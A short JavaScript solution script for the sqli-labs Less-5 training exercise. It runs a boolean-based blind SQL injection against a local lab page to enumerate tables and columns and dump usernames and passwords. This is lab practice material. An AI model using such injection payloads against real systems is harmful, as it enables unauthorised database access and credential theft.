import ky from "ky";
import exploiter from "../lib/exploiter";

const test = new exploiter({
	checker: async (payload) => {
		const res = await ky.get("http://localhost/Less-5/", {
			searchParams: {
				id: payload,
			},
		});
		return (await res.text()).includes("You are in");
	},
	builder: (payload) => `-1' OR ${payload}-- `,
});

await test.runSqli(
	"select group_concat(table_name) from information_schema.tables where table_schema='security'",
);
await test.runSqli(
	"select group_concat(column_name) from information_schema.columns where table_name='users'",
);
await test.runSqli("select group_concat(username,0x3a,password) from users");

// solution to sqli-labs less-5
